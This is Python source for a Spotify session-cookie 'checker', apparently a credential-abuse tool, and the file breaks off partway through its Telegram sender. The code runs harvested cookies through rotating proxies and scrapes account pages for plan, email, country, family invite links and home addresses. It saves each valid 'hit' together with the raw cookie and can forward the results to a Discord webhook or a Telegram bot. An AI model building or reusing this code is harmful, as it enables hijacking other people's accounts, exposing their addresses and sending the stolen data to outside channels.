                                              
                                   
                        
import requests
import os
import shutil
import json
import threading
import random
import sys
import string
import re
import copy
from datetime import datetime
try:
    import yaml
except ImportError:
    yaml = None

DEFAULT_CONFIG = {
    "txt_fields": {
        "plan": True,
        "email": True,
        "country": True,
        "owner": True,
        "free_slots": True,
        "invite_link": True,
        "address": True
    },
    "notifications": {
        "webhook": {
            "enabled": False,
            "url": "",
            "mode": "full"
        },
        "telegram": {
            "enabled": False,
            "bot_token": "",
            "chat_id": "",
            "mode": "full"
        }
    },
    "display": {
        "mode": "log"
    },
    "retries": {
        "error_proxy_attempts": 3
    }
}

PLAN_IMAGE_URLS = {
    "premium_like": "https://i.ibb.co/7d46Mh6t/images.png",
    "family": "https://i.ibb.co/Kp7cMby0/da350adf32b1be5c56a4601202cf134a.jpg",
    "duo": "https://i.ibb.co/PG73tCpm/bd0e018e9ff3117ed73c8fde23885a66.jpg",
    "unknown": "https://i.ibb.co/dwd5ddxj/download-8.jpg"
}

DEFAULT_YAML_CONFIG = """# Checker By: https://github.com/harshitkamboj
# Website: https://harshitkamboj.in
# Discord: illuminatis69
# Spotify Checker configuration
# true/false fields let users turn output lines ON/OFF in generated txt.
txt_fields:
  plan: true # Plan name (Premium, Family Premium, etc.)
  email: true # Account email if found
  country: true # Country code (US, UK, North Korea etc.)
  owner: true # shown only for family/duo plans (true = owner/master, false = member)
  free_slots: true # shown only for family owner accounts; remaining member slots
  invite_link: true # shown only for family owner accounts when invite URL is available
  address: true # shown only for family owner accounts when address is available

notifications:
  webhook:
    enabled: false # true to send output to Discord webhook
    url: "" # put full webhook URL here
    mode: "full" # allowed: "full" or "invite_address_only"
  telegram:
    enabled: false # true to send output to Telegram
    bot_token: "" # token from @BotFather
    chat_id: "" # your chat/channel id (example: "-1001234567890")
    mode: "full" # allowed: "full" or "invite_address_only"

display:
  mode: "simple" # allowed: "log" or "simple"

retries:
  error_proxy_attempts: 3 # retry attempts on network/proxy errors (rotates proxy each try)
"""

def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')

def set_console_title(title):
    if os.name == 'nt':
        os.system(f'title SpotifyChecker - {title}')
    else:
        sys.stdout.write(f'\033]0;{title}\007')
        sys.stdout.flush()

def create_base_folders():
    base_folders = ["cookies", "failed", "broken", "hits"]
    for folder in base_folders:
        if not os.path.exists(folder):
            os.makedirs(folder)
    if not os.path.exists("proxy.txt"):
        with open("proxy.txt", 'w') as f:
            f.write("# Add your proxies here\n")
            f.write("# Format: ip:port or ip:port@user:pass\n")
            f.write("# Example:\n")
            f.write("# 127.0.0.1:8080\n")
            f.write("# 192.168.1.1:3128@username:password\n")

def merge_config(default_cfg, user_cfg):
    merged = copy.deepcopy(default_cfg)
    if not isinstance(user_cfg, dict):
        return merged
    for key, value in user_cfg.items():
        if key in merged and isinstance(merged[key], dict) and isinstance(value, dict):
            merged[key] = merge_config(merged[key], value)
        else:
            merged[key] = value
    return merged

def load_config():
    config_yaml_path = "config.yml"

    if os.path.exists(config_yaml_path):
        if yaml is None:
            print("Warning: PyYAML not installed. Run: pip install -r requirements.txt")
            return copy.deepcopy(DEFAULT_CONFIG), "default"
        try:
            with open(config_yaml_path, "r", encoding="utf-8") as f:
                user_config = yaml.safe_load(f) or {}
            return merge_config(DEFAULT_CONFIG, user_config), config_yaml_path
        except:
            print("Warning: Invalid config.yml. Using default config.")
            return copy.deepcopy(DEFAULT_CONFIG), "default"

    with open(config_yaml_path, "w", encoding="utf-8") as f:
        f.write(DEFAULT_YAML_CONFIG)
    return copy.deepcopy(DEFAULT_CONFIG), config_yaml_path

def print_config_summary(config, config_source):
    txt_fields = config.get("txt_fields", {})
    webhook_cfg = config.get("notifications", {}).get("webhook", {})
    telegram_cfg = config.get("notifications", {}).get("telegram", {})
    display_cfg = config.get("display", {})
    retries_cfg = config.get("retries", {})
    retry_attempts = retries_cfg.get("error_proxy_attempts", 3)
    enabled_txt = [k for k, v in txt_fields.items() if bool(v)]
    try:
        retry_attempts = max(1, int(retry_attempts))
    except:
        retry_attempts = 3
    print("Active Config")
    print(f"- Config file: {config_source}")
    print(f"- TXT fields enabled: {', '.join(enabled_txt) if enabled_txt else 'none'}")
    print(
        f"- Webhook: {'ON' if webhook_cfg.get('enabled') else 'OFF'} "
        f"(mode: {webhook_cfg.get('mode', 'full')})"
    )
    print(
        f"- Telegram: {'ON' if telegram_cfg.get('enabled') else 'OFF'} "
        f"(mode: {telegram_cfg.get('mode', 'full')})"
    )
    print(f"- Display: mode={display_cfg.get('mode', 'log')} (colored=ON)")
    print(f"- Retry attempts on proxy/network error: {retry_attempts}")
    print("")

def color_text(text, code, enabled=True):
    if not enabled:
        return text
    return f"{code}{text}\033[0m"

def render_simple_dashboard(counts, plan_counts, owner_plan_counts, cookies_left, cookies_total, colored=True):
    title_color = "\033[96m"
    section_color = "\033[95m"
    label_color = "\033[94m"
    value_color = "\033[93m"
    owner_label_color = "\033[90m"
    progress_color = "\033[92m"
    green = "\033[92m"
    yellow = "\033[93m"
    red = "\033[91m"
    purple = "\033[95m"
    clear_screen()
    processed = cookies_total - cookies_left
    valid = counts['hits'] + counts['free']
    print("""
        ██████████████████████████████████████████████████████████████████████████████████
        █─▄▄▄▄█▄─▄▄─█─▄▄─█─▄─▄─█▄─▄█▄─▄▄─█▄─█─▄███─▄▄▄─█─█─█▄─▄▄─█─▄▄▄─█▄─█─▄█▄─▄▄─█▄─▄▄▀█
        █▄▄▄▄─██─▄▄▄█─██─███─████─███─▄████▄─▄████─███▀█─▄─██─▄█▀█─███▀██─▄▀███─▄█▀██─▄─▄█
        ▀▄▄▄▄▄▀▄▄▄▀▀▀▄▄▄▄▀▀▄▄▄▀▀▄▄▄▀▄▄▄▀▀▀▀▄▄▄▀▀▀▀▄▄▄▄▄▀▄▀▄▀▄▄▄▄▄▀▄▄▄▄▄▀▄▄▀▄▄▀▄▄▄▄▄▀▄▄▀▄▄▀
    by https://github.com/harshitkamboj | website: harshitkamboj.in | discord: illuminatis69
                        (Star The Repo 🌟 and Share for more Checkers)
    """)
    print(color_text("Spotify Checker - Simple Mode", title_color, colored))
    print(
        f"{color_text('Progress:', title_color, colored)} "
        f"{color_text(str(processed), progress_color, colored)}/{color_text(str(cookies_total), progress_color, colored)} "
        f"| {color_text('Left:', title_color, colored)} {color_text(str(cookies_left), yellow, colored)}"
    )
    print("")
    print(color_text("Plan Counts", section_color, colored))
    plan_order = [
        "duo_premium", "family_premium_v2", "family_basic", "premium",
        "premium_mini", "basic_premium", "student_premium",
        "student_premium_hulu", "free", "unknown"
    ]
    for plan_key in plan_order:
        plan_name = plan_name_mapping(plan_key)
        value = plan_counts.get(plan_key, 0)
        print(f"{color_text(plan_name + ':', label_color, colored)} {color_text(str(value), value_color, colored)}")
        if plan_key in ("duo_premium", "family_premium_v2", "family_basic"):
            owner_value = owner_plan_counts.get(plan_key, 0)
            print(f"   {color_text('└─ Owner:', owner_label_color, colored)} {color_text(str(owner_value), value_color, colored)}")
    print("")
    print(color_text("Status", section_color, colored))
    print(f"Valid: {color_text(str(valid), green, colored)}")
    print(f"Failed: {color_text(str(counts['bad']), red, colored)}")
    print(f"Duplicate: {color_text(str(counts.get('duplicate', 0)), purple, colored)}")
    print(f"Error: {color_text(str(counts['errors']), red, colored)}")

def get_run_folder():
    now = datetime.now()
    return f"run_{now.strftime('%Y-%m-%d_%H-%M-%S')}"

def create_output_folder_when_needed(plan, is_sub_account=None, run_folder=None):
    plan_folder_mapping = {
        "duo_premium": "Duo Premium",
        "family_premium_v2": "Family Premium",
        "family_basic": "Family Basic",
        "premium": "Premium",
        "premium_mini": "Premium Mini",
        "basic_premium": "Premium Basic",
        "student_premium": "Student Premium",
        "student_premium_hulu": "Student Premium-Hulu",
        "free": "Free"
    }
    folder_name = plan_folder_mapping.get(plan, "Unknown")
    plans_with_subfolders = ["family_premium_v2", "duo_premium", "family_basic"]
    if plan in plans_with_subfolders:
        if is_sub_account is False:
            sub_folder = "owner_account"
        elif is_sub_account is True:
            sub_folder = "non_owner_account"
        else:
            sub_folder = "unknown"
        output_path = os.path.join("hits", run_folder, folder_name, sub_folder)
    else:
        output_path = os.path.join("hits", run_folder, folder_name)
    if not os.path.exists(output_path):
        os.makedirs(output_path)
    return output_path

def _build_proxy_dict(scheme, host, port, user=None, password=None):
    host = host.strip()
    if host.startswith('[') and host.endswith(']'):
        host = host[1:-1]
    if user is not None and password is not None:
        proxy_url = f"{scheme}://{user}:{password}@{host}:{port}"
    else:
        proxy_url = f"{scheme}://{host}:{port}"
    return {
        "http": proxy_url,
        "https": proxy_url
    }

def _parse_proxy_line(line):
    line = line.strip()
    if not line or line.startswith('#'):
        return None

                                                                               
    line = re.sub(r'^([a-zA-Z][a-zA-Z0-9+.-]*):/+', r'\1://', line)
    line = re.sub(r'\s+', ' ', line).strip()

    url_like = re.match(
        r'^(?P<scheme>https?|socks5h?|socks4a?)://'
        r'(?:(?P<user>[^:@\s]+):(?P<password>[^@\s]+)@)?'
        r'(?P<host>\[[^\]]+\]|[^:\s]+):(?P<port>\d+)$',
        line,
        flags=re.IGNORECASE
    )
    if url_like:
        data = url_like.groupdict()
        return _build_proxy_dict(
            data["scheme"].lower(),
            data["host"],
            data["port"],
            data.get("user"),
            data.get("password")
        )

    userpass_hostport = re.match(
        r'^(?P<user>[^:@\s]+):(?P<password>[^@\s]+)@(?P<host>\[[^\]]+\]|[^:\s]+):(?P<port>\d+)$',
        line
    )
    if userpass_hostport:
        data = userpass_hostport.groupdict()
        return _build_proxy_dict("http", data["host"], data["port"], data["user"], data["password"])

    hostport_userpass = re.match(
        r'^(?P<host>\[[^\]]+\]|[^:\s]+):(?P<port>\d+)@(?P<user>[^:@\s]+):(?P<password>[^@\s]+)$',
        line
    )
    if hostport_userpass:
        data = hostport_userpass.groupdict()
        return _build_proxy_dict("http", data["host"], data["port"], data["user"], data["password"])

    hostport = re.match(r'^(?P<host>\[[^\]]+\]|[^:\s]+):(?P<port>\d+)$', line)
    if hostport:
        data = hostport.groupdict()
        return _build_proxy_dict("http", data["host"], data["port"])

                             
                         
                         
    four_part = line.split(':')
    if len(four_part) == 4:
        a, b, c, d = four_part
        if b.isdigit() and not d.isdigit():
            return _build_proxy_dict("http", a, b, c, d)
        if d.isdigit() and not b.isdigit():
            return _build_proxy_dict("http", c, d, a, b)

                                                          
    split_patterns = [
        r'^(?P<host>\[[^\]]+\]|[^:\s]+):(?P<port>\d+)\s+(?P<user>[^:\s]+):(?P<password>\S+)$',
        r'^(?P<host>\[[^\]]+\]|[^:\s]+):(?P<port>\d+)\|(?P<user>[^:\s]+):(?P<password>\S+)$',
        r'^(?P<host>\[[^\]]+\]|[^:\s]+):(?P<port>\d+);(?P<user>[^:\s]+):(?P<password>\S+)$',
        r'^(?P<host>\[[^\]]+\]|[^:\s]+):(?P<port>\d+),(?P<user>[^:\s]+):(?P<password>\S+)$'
    ]
    for pattern in split_patterns:
        match = re.match(pattern, line)
        if match:
            data = match.groupdict()
            return _build_proxy_dict("http", data["host"], data["port"], data["user"], data["password"])

    return None

def load_proxies():
    proxies = []
    if os.path.exists("proxy.txt"):
        with open("proxy.txt", 'r') as f:
            for line in f:
                proxy = _parse_proxy_line(line)
                if proxy:
                    proxies.append(proxy)
    return proxies

def plan_name_mapping(plan):
    mapping = {
        "duo_premium": "Duo Premium",
        "family_premium_v2": "Family Premium",
        "family_basic": "Family Basic",
        "premium": "Premium",
        "premium_mini": "Premium Mini",
        "basic_premium": "Premium Basic",
        "student_premium": "Student Premium",
        "student_premium_hulu": "Student Premium-Hulu",
        "free": "Free"
    }
    return mapping.get(plan, "Unknown")

def infer_plan_key(plan_name):
    if not plan_name:
        return "unknown"
    name = plan_name.strip().lower()
    if "free" in name:
        return "free"
    if "family" in name and "basic" in name:
        return "family_basic"
    if "family" in name:
        return "family_premium_v2"
    if "duo" in name:
        return "duo_premium"
    if "student" in name and "hulu" in name:
        return "student_premium_hulu"
    if "student" in name:
        return "student_premium"
    if "mini" in name:
        return "premium_mini"
    if "basic" in name and "premium" in name:
        return "basic_premium"
    if "premium" in name:
        return "premium"
    return "unknown"

def _extract_first(text, patterns, flags=0):
    for pattern in patterns:
        match = re.search(pattern, text, flags)
        if match:
            return match.group(1)
    return None

def _to_int(value):
    try:
        return int(str(value).strip())
    except:
        return None

def parse_next_payment_date_from_html(source):
    normalized = source.replace('\\"', '"').replace("&quot;", '"')
    combined = f"{source}\n{normalized}"
    candidate = _extract_first(
        combined,
        [
            r'next bill[^<]{0,220}?\bon\b\s*([0-9]{1,2}/[0-9]{1,2}/[0-9]{4})',
            r'next payment[^<]{0,220}?\bon\b\s*([0-9]{1,2}/[0-9]{1,2}/[0-9]{4})',
            r'next bill[^<]{0,220}?\bon\b\s*([A-Za-z]{3,9}\s+\d{1,2},\s+\d{4})',
            r'next payment[^<]{0,220}?\bon\b\s*([A-Za-z]{3,9}\s+\d{1,2},\s+\d{4})'
        ],
        flags=re.IGNORECASE
    )
    if not candidate:
        return None

    candidate = candidate.strip()
    for fmt in ("%m/%d/%Y", "%B %d, %Y", "%b %d, %Y"):
        try:
            return datetime.strptime(candidate, fmt).date()
        except:
            pass

                                               
    if re.match(r"^\d{1,2}/\d{1,2}/\d{4}$", candidate):
        try:
            part_a, part_b, year = [int(x) for x in candidate.split("/")]
            month, day = part_a, part_b
            if part_a > 12 and part_b <= 12:
                month, day = part_b, part_a
            return datetime(year, month, day).date()
        except:
            return None
    return None

def is_external_billing_managed(source):
    normalized = source.replace('\\"', '"').replace("&quot;", '"')
    combined = f"{source}\n{normalized}"
    return re.search(
        r'managed\s+through\s+(google\s+play|apple|app\s*store|itunes)',
        combined,
        flags=re.IGNORECASE
    ) is not None

def _deep_find_first(obj, key_names):
    if isinstance(obj, dict):
        for key, value in obj.items():
            if str(key).lower() in key_names and value not in (None, ""):
                return value
            nested = _deep_find_first(value, key_names)
            if nested not in (None, ""):
                return nested
    elif isinstance(obj, list):
        for item in obj:
            nested = _deep_find_first(item, key_names)
            if nested not in (None, ""):
                return nested
    return None

def parse_overview_data(source):
    normalized = source.replace('\\"', '"').replace("&quot;", '"')
    combined = f"{source}\n{normalized}"

    logged_in = (
        ('loggedIn\\":true' in source) or
        ('"loggedIn":true' in normalized) or
        ('"isLoggedInUser":true' in normalized)
    )

    plan_name = _extract_first(
        combined,
        [
            r'planName\\":\\"([^"]+)',
            r'"planName":"([^"]+)"',
            r'data-encore-id="text">([^<]+)<'
        ],
        flags=re.IGNORECASE
    )
    plan_key = infer_plan_key(plan_name or "")

    country = _extract_first(
        combined,
        [
            r'country\\":\\"([A-Za-z]{2})',
            r'"country":"([A-Za-z]{2})"',
            r'countryCode\\":\\"([A-Za-z]{2})',
            r'"countryCode":"([A-Za-z]{2})"'
        ]
    )
    if country:
        country = country.upper()

    is_master_match = _extract_first(
        combined,
        [r'isMaster\\":(true|false)', r'"isMaster":(true|false)'],
        flags=re.IGNORECASE
    )
    is_sub_account_match = _extract_first(
        combined,
        [r'isSubAccount\\":(true|false)', r'"isSubAccount":(true|false)'],
        flags=re.IGNORECASE
    )
    is_child_account_match = _extract_first(
        combined,
        [r'isChildAccount\\":(true|false)', r'"isChildAccount":(true|false)'],
        flags=re.IGNORECASE
    )
    recurring_match = _extract_first(
        combined,
        [r'isRecurring\\":(true|false)', r'"isRecurring":(true|false)'],
        flags=re.IGNORECASE
    )
    trial_match = _extract_first(
        combined,
        [r'isTrialUser\\":(true|false)', r'"isTrialUser":(true|false)'],
        flags=re.IGNORECASE
    )
    email = _extract_first(
        combined,
        [r'email\\":\\"([^"]+)', r'"email":"([^"]+)"'],
        flags=re.IGNORECASE
    )
    invite_link = _extract_first(
        combined,
        [
            r'inviteLink\\":\\"([^"]+)',
            r'"inviteLink":"([^"]+)"',
            r'(https://www\.spotify\.com/[^"\s]*family[^"\s]*)'
        ],
        flags=re.IGNORECASE
    )
    address = _extract_first(
        combined,
        [
            r'address\\":\\"([^"]+)',
            r'"address":"([^"]+)"',
            r'streetAddress\\":\\"([^"]+)',
            r'"streetAddress":"([^"]+)"'
        ],
        flags=re.IGNORECASE
    )
    free_slots_direct = _extract_first(
        combined,
        [
            r'freeSlots\\":(\d+)',
            r'"freeSlots":(\d+)',
            r'availableSlots\\":(\d+)',
            r'"availableSlots":(\d+)'
        ],
        flags=re.IGNORECASE
    )
    members_count = _extract_first(
        combined,
        [
            r'membersCount\\":(\d+)',
            r'"membersCount":(\d+)',
            r'memberCount\\":(\d+)',
            r'"memberCount":(\d+)'
        ],
        flags=re.IGNORECASE
    )
    max_members = _extract_first(
        combined,
        [
            r'maxMembers\\":(\d+)',
            r'"maxMembers":(\d+)',
            r'memberLimit\\":(\d+)',
            r'"memberLimit":(\d+)'
        ],
        flags=re.IGNORECASE
    )

    is_sub_account = None
    if is_master_match is not None:
        is_sub_account = (is_master_match.lower() != "true")
    elif is_sub_account_match is not None:
        is_sub_account = (is_sub_account_match.lower() == "true")

    free_slots = _to_int(free_slots_direct)
    if free_slots is None:
        members_count_int = _to_int(members_count)
        max_members_int = _to_int(max_members)
        if members_count_int is not None and max_members_int is not None:
            free_slots = max(max_members_int - members_count_int, 0)

    if invite_link:
        invite_link = invite_link.replace("\\/", "/")

    return {
        "loggedIn": logged_in,
        "currentPlan": plan_key,
        "country": country or "unknown",
        "isRecurring": recurring_match is not None and recurring_match.lower() == "true",
        "isTrialUser": trial_match is not None and trial_match.lower() == "true",
        "isSubAccount": is_sub_account,
        "email": email or "",
        "inviteLink": invite_link or "",
        "address": address or "",
        "freeSlots": free_slots,
        "isChildAccount": is_child_account_match is not None and is_child_account_match.lower() == "true"
    }

def enrich_family_data_from_home_api(data, family_json):
    if not isinstance(family_json, dict):
        return data

    members = family_json.get("members")
    if not isinstance(members, list):
        members = []
    access_control = family_json.get("accessControl")
    if not isinstance(access_control, dict):
        access_control = {}
    features = family_json.get("features")
    if not isinstance(features, list):
        features = []

    logged_member = None
    for member in members:
        if isinstance(member, dict) and member.get("isLoggedInUser") is True:
            logged_member = member
            break

    if logged_member is not None:
        is_master = logged_member.get("isMaster")
        if isinstance(is_master, bool):
            data["isSubAccount"] = (not is_master)
        is_child = logged_member.get("isChildAccount")
        if isinstance(is_child, bool):
            data["isChildAccount"] = is_child

        member_country = logged_member.get("country")
        if (not data.get("country") or str(data.get("country")).lower() == "unknown") and member_country:
            data["country"] = str(member_country).upper()

    max_capacity = _to_int(family_json.get("maxCapacity"))
    if max_capacity is not None:
        free_slots = max(max_capacity - len(members), 0)
        data["freeSlots"] = free_slots
    elif isinstance(access_control.get("planHasFreeSlots"), bool):
                                                      
        data["freeSlots"] = 1 if access_control.get("planHasFreeSlots") else 0

    family_address = family_json.get("address")
    if family_address:
        data["address"] = str(family_address)

    invite_token = family_json.get("inviteToken")
    if invite_token:
                                                               
        data["inviteLink"] = f"https://www.spotify.com/family/join/invite/{invite_token}/"

    if data.get("currentPlan") in ("unknown", "free"):
                                                          
        if "kids" in features or "genAlpha" in features:
            data["currentPlan"] = "family_premium_v2"
        else:
            data["currentPlan"] = "family_basic"

    return data

def get_account_data_from_new_api(session, proxy=None):
    overview_headers = {
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.5",
        "Cache-Control": "no-cache",
        "Connection": "keep-alive",
        "Pragma": "no-cache",
        "Upgrade-Insecure-Requests": "1",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:132.0) Gecko/20100101 Firefox/132.0",
        "X-Requested-With": "XMLHttpRequest"
    }
    overview_urls = [
                                                                       
        "https://www.spotify.com/us/account/overview/?utm_source=spotify&utm_medium=menu&utm_campaign=your_account",
        "https://www.spotify.com/account/overview/?utm_source=spotify&utm_medium=menu&utm_campaign=your_account"
    ]
    overview_resp = None
    last_status_code = None
    for overview_url in overview_urls:
        resp = session.get(overview_url, headers=overview_headers, proxies=proxy, timeout=20)
        last_status_code = resp.status_code
        if resp.status_code in (403, 429):
            return None, resp.status_code
        if resp.status_code == 200:
            overview_resp = resp
            break

    if overview_resp is None:
        return None, last_status_code if last_status_code is not None else 500

    data = parse_overview_data(overview_resp.text)
    if not data.get("loggedIn"):
        return None, 401

    profile_headers = {
        "Accept": "application/json, text/plain, */*",
        "Accept-Language": "en-US,en;q=0.5",
        "Cache-Control": "no-cache",
        "Connection": "keep-alive",
        "Pragma": "no-cache",
        "Referer": "https://www.spotify.com/account/profile/",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:132.0) Gecko/20100101 Firefox/132.0"
    }
    profile_url = "https://www.spotify.com/api/account-settings/v1/profile"
    profile_resp = session.get(
        profile_url,
        headers=profile_headers,
        proxies=proxy,
        timeout=20,
        allow_redirects=False
    )

    if profile_resp.status_code == 200:
        try:
            profile_json = profile_resp.json()
            profile_section = profile_json.get("profile", {})
            if not isinstance(profile_section, dict):
                profile_section = {}

                                                              
            profile_country = profile_section.get("country") or profile_json.get("country")
            profile_email = profile_section.get("email") or profile_json.get("email")
            if profile_country:
                data["country"] = str(profile_country).upper()
            if profile_email:
                data["email"] = str(profile_email)
        except:
            pass

    family_home_url = "https://www.spotify.com/api/family/v1/family/home"
    family_resp = session.get(
        family_home_url,
        headers=profile_headers,
        proxies=proxy,
        timeout=20,
        allow_redirects=False
    )
    if family_resp.status_code == 200:
        try:
            family_json = family_resp.json()
            data = enrich_family_data_from_home_api(data, family_json)
        except:
            pass

    manage_url_candidates = [
        "https://www.spotify.com/us/account/subscription/manage/",
        "https://www.spotify.com/account/subscription/manage/"
    ]
    for manage_url in manage_url_candidates:
        try:
            manage_resp = session.get(
                manage_url,
                headers=overview_headers,
                proxies=proxy,
                timeout=20,
                allow_redirects=True
            )
            if manage_resp.status_code == 200 and manage_resp.text:
                if is_external_billing_managed(manage_resp.text):
                    data["autopayStatus"] = "Unknown"
                    data.pop("nextPaymentDate", None)
                    break
                next_payment_date = parse_next_payment_date_from_html(manage_resp.text)
                if next_payment_date is not None:
                    data["isRecurring"] = True
                    data["nextPaymentDate"] = next_payment_date.isoformat()
                    data["autopayStatus"] = "True"
                    break
        except:
            pass

    return data, 200

def random_number_string(length=8):
    return ''.join(random.choices(string.digits, k=length))

def format_value(val):
    if not val or str(val).lower() == "unknown":
        return random_number_string()
    return val

def is_family_owner_with_slots(data):
    plan = data.get("currentPlan", "unknown")
    is_owner = data.get("isSubAccount") is False
    free_slots = data.get("freeSlots")
    return plan in ("family_premium_v2", "family_basic") and is_owner and isinstance(free_slots, int) and free_slots > 0

def format_cookie_file(data, cookie_content, config):
    txt_fields = config.get("txt_fields", {})
    lines = []
    plan = plan_name_mapping(data.get("currentPlan", "unknown"))
    country = data.get("country", "unknown")
    email = data.get("email", "")
    owner = "True" if data.get("isSubAccount") is False else "False"
    free_slots = data.get("freeSlots")
    invite_link = data.get("inviteLink", "")
    address = data.get("address", "")
    next_payment_iso = data.get("nextPaymentDate", "")
    autopay_status = data.get("autopayStatus", "")
    is_family_or_duo = data.get("currentPlan") in ("family_premium_v2", "family_basic", "duo_premium")
    is_family_owner = data.get("currentPlan") in ("family_premium_v2", "family_basic") and data.get("isSubAccount") is False

    if txt_fields.get("plan", True):
        lines.append(f"Plan: {plan}")
    if txt_fields.get("email", True):
        lines.append(f"Email: {email}")
    if txt_fields.get("country", True):
        lines.append(f"Country: {country}")
    if str(autopay_status).lower() == "unknown":
        lines.append("Autopay: Unknown")
    if str(autopay_status).lower() != "unknown" and data.get("isRecurring", False) and next_payment_iso:
        try:
            payment_date = datetime.strptime(next_payment_iso, "%Y-%m-%d").date()
            days_left = (payment_date - datetime.now().date()).days
            payment_text = f"{days_left} Days | {payment_date.day} {payment_date.strftime('%b %Y')}"
            lines.append(f"Next Payment: {payment_text}")
        except:
            pass
    if txt_fields.get("owner", True) and is_family_or_duo:
        lines.append(f"Owner: {owner}")
    if data.get("isChildAccount") is True:
        lines.append("Child Account: True")
    if txt_fields.get("free_slots", True) and is_family_owner:
        lines.append(f"Free Slots: {free_slots if isinstance(free_slots, int) else 'unknown'}")
    if txt_fields.get("invite_link", True) and is_family_owner and invite_link:
        lines.append(f"Invite link: {invite_link}")
    if txt_fields.get("address", True) and is_family_owner and address:
        lines.append(f"Address: {address}")

    lines.append("")
    lines.append("Checker By: github.com/harshitkamboj | Website: harshitkamboj.in")
    lines.append("Spotify COOKIE :👇")
    lines.append("")
    lines.append(cookie_content.strip())
    lines.append("")
    return "\n".join(lines)

def build_invite_address_message(data):
                               
    free_slots = data.get("freeSlots")
    invite_link = data.get("inviteLink", "")
    address = data.get("address", "")
    lines = ["# [Spotify Family Invite](https://github.com/harshitkamboj/Spotify-Cookie-Checker)"]
    if isinstance(free_slots, int):
        lines.append(f"**Free Slots:** {free_slots}")
    if invite_link:
        lines.append(f"**Invite link:** <{invite_link}>")
    if address:
        lines.append("**Address:**")
        lines.append(f"```{address}```")
    lines.append("")
    lines.append(
        "**[Github](https://github.com/harshitkamboj)** | **[Website](https://harshitkamboj.in)** | **[Discord](https://discord.com/users/1171797848078172173)**"
    )
    return "\n".join(lines)

def _escape_html(text):
    return (
        str(text)
        .replace("&", "&amp;")
        .replace("<", "&lt;")
        .replace(">", "&gt;")
    )

def build_invite_address_message_telegram(data):
    free_slots = data.get("freeSlots")
    invite_link = data.get("inviteLink", "")
    address = data.get("address", "")
    lines = ['<b><a href="https://github.com/harshitkamboj/Spotify-Cookie-Checker">Spotify Family Invite</a></b>']
    if isinstance(free_slots, int):
        lines.append(f"<b>Free Slots:</b> {free_slots}")
    if invite_link:
        lines.append(f"<b>Invite link:</b> {_escape_html(invite_link)}")
    if address:
        lines.append("<b>Address:</b>")
        lines.append(f"<code>{_escape_html(address)}</code>")
    lines.append("")
    lines.append(
        '<b><a href="https://github.com/harshitkamboj">Github</a></b> | '
        '<b><a href="https://harshitkamboj.in">Website</a></b> | '
        '<b><a href="https://discord.com/users/1171797848078172173">Discord</a></b>'
    )
    return "\n".join(lines)

def build_full_notification_message(data):
    plan = plan_name_mapping(data.get("currentPlan", "unknown"))
    country = data.get("country", "unknown")
    lines = [
        "Spotify Account Details",
        f"Plan: {plan}",
        f"Country: {country}"
    ]
    if data.get("currentPlan") in ("family_premium_v2", "family_basic", "duo_premium") and data.get("isSubAccount") is False:
        lines.append("Owner: True")
    lines.extend([
        "",
        "Github: https://github.com/harshitkamboj | Website: https://harshitkamboj.in | Discord: https://discord.com/users/1171797848078172173"
    ])
    return "\n".join(lines)

def build_full_notification_message_discord(data):
    plan = plan_name_mapping(data.get("currentPlan", "unknown"))
    country = data.get("country", "unknown")
    lines = [
        "# [Spotify Account Details](https://github.com/harshitkamboj/Spotify-Cookie-Checker)",
        f"**Plan:** {plan}",
        f"**Country:** {country}"
    ]
    if data.get("currentPlan") in ("family_premium_v2", "family_basic", "duo_premium") and data.get("isSubAccount") is False:
        lines.append("**Owner:** True")
    lines.extend([
        "",
        "**[Github](https://github.com/harshitkamboj)** | **[Website](https://harshitkamboj.in)** | **[Discord](https://discord.com/users/1171797848078172173)**"
    ])
    return "\n".join(lines)

def build_full_notification_message_telegram(data):
    plan = plan_name_mapping(data.get("currentPlan", "unknown"))
    country = data.get("country", "unknown")
    lines = [
        '<b><a href="https://github.com/harshitkamboj/Spotify-Cookie-Checker">Spotify Account Details</a></b>',
        f"<b>Plan:</b> {_escape_html(plan)}",
        f"<b>Country:</b> {_escape_html(country)}"
    ]
    if data.get("currentPlan") in ("family_premium_v2", "family_basic", "duo_premium") and data.get("isSubAccount") is False:
        lines.append("<b>Owner:</b> True")
    lines.extend([
        "",
        '<b><a href="https://github.com/harshitkamboj">Github</a></b> | '
        '<b><a href="https://harshitkamboj.in">Website</a></b> | '
        '<b><a href="https://discord.com/users/1171797848078172173">Discord</a></b>'
    ])
    return "\n".join(lines)

def get_notification_image_url(data, invite_mode=False):
    if invite_mode:
        return PLAN_IMAGE_URLS["family"]
    plan = data.get("currentPlan", "unknown")
    if plan in ("family_premium_v2", "family_basic"):
        return PLAN_IMAGE_URLS["family"]
    if plan == "duo_premium":
        return PLAN_IMAGE_URLS["duo"]
    if plan == "unknown":
        return PLAN_IMAGE_URLS["unknown"]
    return PLAN_IMAGE_URLS["premium_like"]

def send_discord_webhook(webhook_url, message_text, file_name=None, file_content=None, image_url=None):
    if not webhook_url:
        return
    try:
        payload = {"content": message_text}
        if image_url:
            payload["embeds"] = [{"image": {"url": image_url}}]
        if file_name and file_content:
            requests.post(
                webhook_url,
                data={"payload_json": json.dumps(payload)},
                files={"file": (file_name, file_content.encode("utf-8"), "text/plain")},
                timeout=20
            )
        else:
            requests.post(webhook_url, json=payload, timeout=20)
    except:
        pass

def send_telegram(bot_token, chat_id, message_text, file_name=None, file_content=None, image_url=None):
    if not bot_token or not chat_id:
        return
    try:
        has_file = bool(file_name and file_content)

                                                                                 
                                                                      
        if image_url and not has_file:
            photo_url = f"https://api.telegram.org/bot{bot_token}/sendPhoto"
            requests.post(
                photo_url,
                data={
                    "chat_id": chat_id,
                    "photo": image_url,
                    "caption": message_text,
                    "parse_mode": "HTML",
                    "disable_web_page_preview": True
                },
                timeout=20
            )

        if has_file:
            caption_text = message_text
            if image_url:
                caption_text += f'\n<b>Image:</b> <a href="{_escape_html(image_url)}">Open</a>'
            doc_url = f"https://api.telegram.org/bot{bot_token}/sendDocument"
            requests.post(
                doc_url,
                data={"chat_id": chat_id, "caption": caption_text, "parse_mode": "HTML"},
                files={"document": (file_name, file_content.encode("utf-8"), "text/plain")},
                timeout=20
            )
        elif not image_url:
            url = f"https://api.telegram.org/bot{bot_token}/sendMessage"
            requests.post(
                url,
